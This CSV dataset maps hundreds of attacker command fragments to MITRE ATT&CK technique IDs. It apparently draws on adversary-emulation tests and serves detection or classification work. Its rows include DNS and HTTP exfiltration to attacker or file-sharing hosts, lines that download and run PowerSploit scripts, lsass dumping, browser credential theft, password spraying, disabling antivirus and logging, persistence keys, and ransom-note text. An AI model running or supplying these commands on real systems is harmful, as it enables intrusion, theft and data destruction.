command,mitre_id
"rundll32 vbscript:""\..\mshtml,#135 ""+String(CreateObject(""WScript.Shell"").Run(""$command_to_execute""),0)",T1218
ilasm.exe {PATH_ABSOLUTE:.txt} /exe,T1127
Update.exe --update={PATH_SMB:folder},T1218
HKLM\SYSTEM\Microsoft\Cryptography\MachineGUID,T1082
$FILE_NAME,T1070
Software\Classes\scConfig,T1027
"reg add ""hklm\system\currentcontrolset\control\lsa"" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0",T1112
reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f,T1112
GetQueuedCompletionPort(),T1486
"dig @$attacker_dns_server -p $dns_port $(echo ""$secret_info"" | base64).google.com",T1048
sfindr,T1083
"applicationPath = ""C:\Windows\System32\calc.exe""",T1137
del,T1485
evil-winrm -i $destination_address -u $user_name -p $password,T1021
dsenableroot #current user,T1078
HKCU\Software\Microsoft\Office\&lt;version&gt;\&lt;product&gt;\Security\VBAWarnings,T1112
"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v CurrentBuildNumber",T1082
"(New-Object System.Net.WebClient).DownloadFile(""$remote_file"", ""$destination_path"")",T1105
"rundll32.exe url.dll,FileProtocolHandler {PATH_ABSOLUTE:.exe}",T1218
krb5cc_%UID%,T1558
sudo tcpdump -c 5 -nnni $interface,T1040
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\last_edate,T1012
grep 'x:0:' /etc/passwd > $output_file,T1087
GdipSaveImageToStream,T1113
Policy.vpol,T1555
WH_KEYBOARD_LL,T1106
ProcessDebugFlags,T1106
iam.serviceAccountTokenCreator,T1548
Library/LaunchDaemons,T1543
mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER,T1218
C:\Windows\System32\net.exe stop MSSQLSERVER,T1489
vssadmin resize shadowstorage,T1490
"echo """" | ""$plink_file"" ""$vm_host"" -ssh -l ""$vm_user"" -pw ""$vm_pass"" -m ""$vib_install""",T1129
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableRoutinelyTakingAction"" -Value 1",T1562
HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{3ef41072-a2f1-21c8-c5c1-70c2c3bc7905},T1547
reg save,T1003
GetComputerNameA,T1106
/etc/rc.local,T1037
foreach ($password in $passwordList){,T1110
SystemProcessInformation,T1057
net time \\$computer_name,T1124
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKey /t REG_DWORD /d 2 /f",T1112
"@FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:""%userdomain%\%n"" ""$password"" 1>NUL 2>&1 && @echo [*] %n:$password && @net use /delete %logonserver%\IPC$ > NUL",T1110
supportaccount,T1036
"""$file_path""",T1548
/usr/local/lib/udev/rules.d/,T1546
"New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name ""COR_PROFILER_PATH"" -PropertyType String -Value ""$file_name"" -Force | Out-Null",T1574
chmod +x /Users/Shared/AppStore.app,T1222
SCHTASKS /Create /SC ONCE /TN spawn /TR $task_command /ST $time,T1053
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null,T1137
c:\windows\syswow64,T1543
curl -F 'file=@$input_file' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/,T1048
Start-Process,T1059
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s,T1552
%Temp%\setup.exe,T1027
[HKLM|HKCU]\…\CurrentVersion\Run,T1547
type \\<hostname>\c$\Users\<username>\Favorites\Links\Bookmarks bar\Imported From IE\*citrix*,T1217
dscl . list /Users,T1087
find / -perm +4000 2>/dev/null,T1548
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run,T1060
show version,T1082
if (-Not $at) {,T1484
"Add-ADGroupMember ""$group"" $account",T1098
"echo ""### END INIT INFO"" >> /etc/init.d/T1543.002",T1543
fsutil.exe usn deletejournal /d c:,T1485
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships(),T1482
certutil -hashfile,T1105
get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE},T1069
foreach($password in $passwords) {,T1110
dscacheutil -q group,T1087
nmap -Pn -sV -p $port_range $host,T1046
systemctl enable T1543.002,T1543
"""import os; os.system('calc.exe')"" | Out-File -FilePath ""$UserDir\usercustomize.py"" -Encoding ASCII",T1546
"reg query ""HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer"" /v svcVersion",T1518
/System/Library/LaunchAgents,T1543
"reg add ""HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v DefaultUserName /t REG_SZ /d Administrator /f",T1562
"powershell.exe -ep bypass -command ""Invoke-AllTheThings...""",T1059
chmod $numeric_mode $file_or_folder,T1222
"Set-ItemProperty ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Shell"" ""explorer.exe, $binary_to_execute"" -Force",T1547
WinExec(),T1106
"echo ""test"" > $file_name | set-content -path test.txt -stream $ads_filename -value ""test""",T1564
"Set-MailboxAuditBypassAssociation -Identity ""$target_email"" -AuditBypassEnabled $true",T1562
JohnDoe,T1497
"$History | Out-File -FilePath ""$dest_path""",T1217
C API,T1559
Enable-TransportAgent $transport_agent_identity,T1505
sleep -s 5,T1036
sudo $MimiPenguin_Location > $output_file,T1003
"Set-ItemProperty -Path ""HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig"" -Name 'Security Packages old' -Value ""$oldvalue"";",T1547
$cmdlets},T1059
infpub.dat,T1110
conhost.exe --headless {CMD},T1202
GetRef,T1059
smbutil view -g //$computer_name,T1135
$totalclosed++ | Out-Null,T1016
firewallsd,T1562
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",T1071
sudo srm $system_log_path #system log file deletion,T1070
Dotnetsearch -noninteractive -consoleoutput,T1518
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\$clsid' -Value '$clsid_description',T1546
"Get-ChildItem | Where-Object {$_.Name -notlike ""*.txt""} | Foreach-Object { Move-Item $_.Name -Destination $local_path }",T1105
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force",T1484
"Set-ItemProperty -Path $commandpath -Name ""(default)"" -Value ""$commandtorun"" -Force -ErrorAction SilentlyContinue | Out-Null",T1548
"schtasks /create /ru ""SYSTEM"" /tn ""update"" /tr ""cmd /c c:\windows\temp\update.bat"" /sc once /f /st",T1053
"Set-ItemProperty ""HKLM:\software\microsoft\windows defender\spynet"" -Name ""SubmitSamplesConsent"" -Value 0",T1562
net user $guest_user $guest_password,T1078
Get-PSDrive,T1680
Connect-AzureAD,T1136
". ""$test_harness""",T1218
"if (test-path ""$env:localappdata/Microsoft/Edge/User Data/Default/Login Data"") {copy-item ""$env:localappdata/Microsoft/Edge/User Data/Default/Login Data"" -destination ""$exfil_folder\T1555.003Edge_Login Data""} else {}",T1555
cd $finalpath,T1204
cmd.exe,T1059
consent.exe,T1134
Get-CachedGPPPassword,T1552
C:\Users\<Username>\AppData\Roaming\Microsoft\store,T1074
Add-Type -AssemblyName System.IdentityModel,T1558
TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();,T1562
ADORE.XSEC,T1037
"elseif ($value -eq ""0"")",T1137
iphlpsvc,T1036
ip route show,T1018
LOCALAPPDATA%\MicroSoft Updatea\uplog.tmp,T1074
"dir ""%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*"" >> $output_file",T1083
"1..100 | ForEach-Object { $out = new-object byte[] 1073741; (new-object Random).NextBytes($out); [IO.File]::WriteAllBytes(""c:\test.$_.akira"", $out) }",T1486
"wget --post-data=""msg=AtomicTestT1048.002"" --timeout=5 --no-check-certificate $endpoint_domain --delete-after",T1048
find,T1548
Xcls,T1059
"sudo lsmod | grep -i ""hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc""",T1082
$p.Id | Out-File -FilePath $pidPath -Encoding ascii -Force,T1491
DefaultAccount,T1036
conn.exe,T1036
/Users/Shared/irc.pid,T1480
taskkill /IM a.exe /F,T1204
"setspn.exe -T $domain_name -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }",T1558
certoc.exe -GetCACAPS {REMOTEURL:.ps1},T1105
expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat,T1564
"wmic qfe get description,installedOn /format:csv",T1047
comsvcs.dll,T1003
ClearBrowsingHistoryOnExit,T1070
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID"" /ve /T REG_SZ /d ""{00000001-0000-0000-0000-0000FEEDACDC}"" /f",T1546
"echo 'name=""art_test""' >> $rc_service_path/$rc_service_file",T1543
Set-PSReadlineOption -HistorySaveStyle SaveNothing,T1070
"trap 'echo ""$(date +""%d/%m/%y %H:%M:%S.%s"") $USER $BASH_COMMAND"" >> $output_file' DEBUG",T1056
"New-ItemProperty -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"" -Name ""DisableUnsafeLocationsInPV"" -Value ""1"" -PropertyType ""Dword""",T1562
wmic process call create,T1047
printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common,T1037
del AtomicTestFileT1105.js /Q >nul 2>&1,T1105
"Start-Process -FilePath ""$executable_filepath""",T1036
HKCU\Software\Run auto_update,T1547
"Write-Host ""Creating system environment variables"" -ForegroundColor Cyan",T1574
ExampleFunctionW,T1218
"Get-Item -Path ""HKCU:Software\Microsoft\Windows\CurrentVersion\RunOnce""",T1012
del %TEMP%\PrintBrm.zip >nul 2>&1,T1105
/Resources,T1564
(LCG): staten+1 = (690069 × staten + 1) mod 232,T1027
Disconnect-AzureAD > $null,T1110
execl,T1574
Microsoft.KeyVault/Vaults/write,T1555
".\kerbrute.exe userenum -d $Domain --dc $DomainController ""PathToAtomicsFolder\..\ExternalPayloads\username.txt""",T1087
rundll32.exe keymgr.dll KRShowKeyMgr,T1555
.\AActdata\,T1074
MicrosoftUpdator.vbs,T1059
KEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt\strDataDir,T1012
HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Privacy,T1070
echo b> /proc/sysrq-trigger,T1562
MicrosoftCurrentupdatesCheck,T1036
photo_high_resj.png,T1036
"Add-Content -Path ""C:\Windows\System32\termsrv.dll"" -Value ""`n"" -NoNewline -ErrorAction Ignore",T1505
"Write-Output ""`nFound storage account $($account.name)""",T1619
ps >> $output_file,T1057
Set-Location Cert:\LocalMachine\My,T1552
"Write-Host ""Port $port is open on $ip""",T1046
foreach ($syntax in $syntaxList) {,T1049
$tr | Out-File -FilePath $out -Encoding UTF8,T1083
Get-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append $File_to_output,T1083
"UACBypass -noninteractive -command ""C:\windows\system32\cmd.exe"" -technique magic",T1548
"Invoke-Maldoc -macroCode ""$macro"" -officeProduct ""Word"" -sub ""Extract"" -NoWrap",T1564
sudo -l,T1548
pixtool.exe launch {PATH_ABSOLUTE:.exe},T1127
aws configservice delete-configuration-recorder --configuration-recorder-name $configuration_recorder_name --region $region,T1562
"cmd /c ""PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe"" $remote_file $destination_path",T1105
tasklist /s,T1057
"reg add ""hklm\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp"" /v SecurityLayer /t REG_DWORD /d 0 /f",T1112
wevtutil cl application,T1070
"Invoke-WebRequest -OutFile $installer ""https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_25.1.10.9197_Release.msi""",T1219
"& ""$python_exe"" -c ""print('Triggering Hook via usercustomize...')""",T1546
logagent.exe,T1055
"rundll32.exe ieadvpack.dll,LaunchINFSection ""$inf_to_execute"",DefaultInstall_SingleUser,1,",T1218
"Stop-Process -Name ""notepad"" -force -erroraction silentlycontinue",T1134
CloseHandle,T1106
Remove-AzureADUser -ObjectId $userprincipalname,T1531
"cmd.exe /c ""wmic csproduct get UUID""",T1569
Invoke-WebRequest -Uri $ip_address -Method POST -Body $content,T1048
"$ShortCut.TargetPath=""cmd.exe""",T1547
procdump -ma lsass.exe lsass_dump,T1003
bash $TMPFILE,T1059
IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $target -Username $user_name -Hash $ntlm -Command $command,T1550
dsquery subnet,T1018
.zshrc_aliases,T1546
"} elseif (""$execution_option"" -eq ""replace_file"") {",T1528
{$props = @();$user | Get-Member | foreach-object{$props+=$_.Name};,T1552
"Set-ItemProperty -Path ""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"" -Name ""UpdateRingSettingURLFromOC"" -Value ""$remote_url"" -Type String -Force",T1105
echo ChangeMe!>> passwords.txt,T1110
REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /ve /t REG_SZ /d C:\IDontExist.dll /f,T1562
copy %windir%\system32\certutil.exe %temp%\tcm.tmp,T1140
GetTickCount(),T1124
"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\cleanuppath"" /t REG_EXPAND_SZ /d ""%systemroot%\system32\notepad.exe"" /f",T1112
extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe,T1564
"foreach ($user in $selectUsers) { $url= ""https://graph.microsoft.com/v1.0/users/$($user)/messages"" ; Invoke-MgGraphRequest -Uri $url -Method GET -OutputType PSObject}",T1114
vbc -reference:Microsoft.VisualBasic.dll {PATH_ABSOLUTE:.vb},T1127
"DefaultPack.EXE /C:""{CMD}""",T1218
mkdir /var/tmp/.hidden-directory,T1564
New-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force,T1546
"echo 'echo ""T1027.013: Payload extracted from encrypted ZIP""' >> /tmp/art_payload.sh",T1027
RSAAuthentication,T1098
"Write-Host ""Error: domain """"$domain_name"""" not found""",T1484
net view \\\\remotesystem,T1135
net.exe user /domain,T1087
Security Settings\Local Policies\Audit Policy,T1562
GetTickCount,T1497
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin -Verbose,T1069
Get-NetTCPConnection,T1049
"cmd /c wmic process where name=""avp.exe""",T1518
"if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo ""$ssh_authorized_keys"" > ~/.ssh/authorized_keys; fi;",T1098
"Write-Host ""Directory $dest_path already exists."" }",T1218
CurrentUICulture = [System.Globalization.CultureInfo]::CurrentUICulture.Name,T1614
scp $username@$remote_host:$remote_file $local_path,T1105
photo_high_re\u202Egnp.js,T1036
WriteProcessMemory,T1055
"msedge.exe --headless --enable-logging --disable-gpu --dump-dom ""{REMOTEURL:.base64.html}"" > {PATH:.b64}",T1105
HISTFILE,T1070
HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds.,T1027
md $folder_name,T1564
Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeAll,T1053
reg save HKLM\SYSTEM $extract_path\SYSTEM_HIVE,T1003
BlobName = $blob,T1619
%CommonFiles%,T1547
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v DisallowRun /t REG_DWORD /d 1 /f,T1112
HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\,T1547
$PS2,T1056
Parameters,T1574
update.bat,T1059
"& ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" $optional_args -h $domain -s subtree -f ""objectclass=computer"" *",T1087
SIGTTOU,T1564
"echo """" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
echo $ENCODED > $encoded_file && cat < $encoded_file | base64 -d,T1140
"echo ""$TEMPDIR"" > /tmp/atomic_python_hook_path.txt",T1546
xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC},T1218
esentutl.exe /y /vss $file_path /d $copy_dest/$file_name,T1003
NtRaiseHardError,T1529
verclsid.exe /S /C {CLSID},T1218
read(2),T1574
wmic baseboard get version,T1082
userParameters,T1556
Cscript.exe,T1216
script:,T1216
mstask,T1053
$Create.Save(),T1547
.ssh,T1005
"New-LocalUser -Name ""$username"" -NoPassword",T1136
"echo ""3. Use this code - - to log into our chat."" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
"echo ""Then all of this will be published in our blog -"" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
Filter = [Ref] $Filter;,T1546
sudo spctl --master-disable,T1562
nodeSelector,T1543
"try{$response = invoke-webrequest ""https://$base_name.blob.core.windows.net/$container_name/$blob_name"" -method ""GET""}",T1619
else{,T1137
Register-cimprovider -path {PATH_ABSOLUTE:.dll},T1218
"""$local_folder\$local_executable"" ptt /ticket:kirbifile",T1558
"cd ""$env:userprofile\Downloads\T1036""",T1036
"Invoke-WebRequest -Uri $ip_address -Method POST -Body ""$input_file""",T1027
"QueueName = """"",T1619
ShowLocalGroupDetails,T1069
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svchost : %APPDATA%\Microsoft\Network\svchost.exe,T1547
sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist,T1562
"if [ -x ""$(command -v lspci)"" ]; then sudo lspci | grep -i ""vmware\|virtualbox""; fi",T1082
netsh interface portproxy add v4tov4 listenport=$listenport connectport=$connectport connectaddress=$connectaddress,T1090
powershell.exe,T1059
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Microsoft-Windows-Sysmon-Operational,T1562
sudo touch /private/var/db/emondClients/$empty_file,T1543
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows,T1546
kubectl get secrets -n $namespace,T1552
GrayStringW,T1106
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt,T1564
SilentCleanup,T1053
"echo var url = ""$file_url"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > $script_file",T1204
sc start sshd,T1569
/var/opt/quest/vas/authcache/vas_auth.vdb,T1003
foreach($member in $fmm) {,T1098
"wmic.exe process get brief /format:""{PATH_SMB:.xsl}""",T1218
DisableAPIServiceAccess,T1489
echo 'set +o history' >> ~/.bashrc,T1070
/home/perl/PAUS.pm,T1074
Get-AdGroup -Filter *,T1069
ProcessIdleTasks,T1070
"UserLanguages = (Get-WinUserLanguageList).LanguageTag -join ', '",T1614
"Write-Host "" [!] $user:${password} are valid credentials!""",T1110
./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force,T1562
sc config eventlog start=disabled,T1562
"Local = ""$($_.LocalAddress):$($_.LocalPort)""",T1049
plist,T1546
SYSTEM\CurrentControlSet\Services,T1489
"Start-Process ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat""",T1547
"powershell -executionpolicy bypass -command ""$file_path\Get-Inbox.ps1"" -file $output_file",T1114
"echo ""$message"" > ""$file_contents_path"" & type ""$file_contents_path""",T1059
docker build -t t1069 $PathtoAtomicsFolder/T1069.001/src/,T1069
takeown,T1222
ToolTech-RM,T1112
IF NOT EXIST C:\Windows\System32\Magnify_backup.exe (copy C:\Windows\System32\Magnify.exe C:\Windows\System32\Magnify_backup.exe) ELSE ( pushd ),T1546
LSADUMP::DCSync,T1550
syslogd,T1543
cmd.exe /c systeminfo,T1082
ImpersonateLoggedOnUser/SetThreadToken,T1134
passhunt -local $true -noninteractive,T1552
nbtstat -s,T1016
provlaunch.exe LOLBin,T1218
EhStorAurhn.exe,T1055
Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet,T1562
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options,T1012
"mklink c:\testbypass.exe ""\\?\C:\Windows \System32\mmc.exe""",T1548
"reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ ""PathToAtomicsFolder\T1556.002\lsa_backup.reg""",T1556
WshShortcut,T1559
LASTBOOTUP,T1082
foreach ($Computer in $Computers) {,T1018
launchctl submit -l $label_name -- $executable_path,T1569
exit 0,T1036
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OutlookMicrosift,T1547
"schTasksCmd = ""schtasks /create /tn """""" & taskName & """""" /tr """""" & applicationPath & """""" /sc daily /st "" & runTime & "" /f""",T1137
New-Item -ItemType Directory -Path $TempDir -Force,T1546
